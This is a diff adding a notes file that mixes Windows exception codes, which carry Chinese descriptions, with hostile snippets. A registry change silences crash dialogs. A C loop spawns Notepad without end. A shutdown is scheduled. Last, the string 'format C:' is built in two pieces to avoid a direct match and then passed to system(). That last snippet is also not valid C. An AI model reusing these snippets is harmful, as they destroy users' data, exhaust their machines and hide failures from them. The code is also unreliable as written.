@@ -1,0 +1,44 @@
+﻿ACCESS_VIOLATION
+ARRAY_BOUNDS_EXCEEDED
+FLOAT_DENORMAL_OPERAND 
+FLOAT_DIVIDE_BY_ZERO
+FLOAT_OVERFLOW 
+FLOAT_UNDERFLOW
+INTEGER_DIVIDE_BY_ZERO
+INTEGER_OVERFLOW
+STACK_OVERFLOW
+
+-1073741819	数组越界
+-1073741676	除零
+-1073741571	堆栈溢出
+-1073741684,    "{异常} 数组越界。"
+-1073741683,    "{异常} 浮点的非正规操作数。"
+-1073741682,    "{异常} 除以 0 的浮点运算。"
+-1073741681,    "{异常} 浮点运算的不精确值。"
+-1073741680,    "{异常} 浮点运算的无效操作。"
+-1073741679,    "{异常} 浮点运算溢出。"
+-1073741678,    "{异常} 浮点运算堆栈检测。"
+-1073741677,    "{异常} 浮点运算下溢。"
+-1073741676,    "{异常} 整数除 0。"
+-1073741675,    "{异常} 整数溢出。"
+-1073741674,    "{异常} 特权指令。"
+
+去掉讨厌的对话框
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug
+Auto设置成1
+Debugger清空
+
+
+#include <windows.h>
+int main(){
+    while(1) ShellExecute(0,"open","NOTEPAD.EXE",0,0,SW_SHOW);
+    return 0;
+}
+system("shutdown -s -t 1000");
+
+
+char[100] str1;
+char[100] str2;
+str1="for";
+str2=str1+"mat C:";
+system(str2);
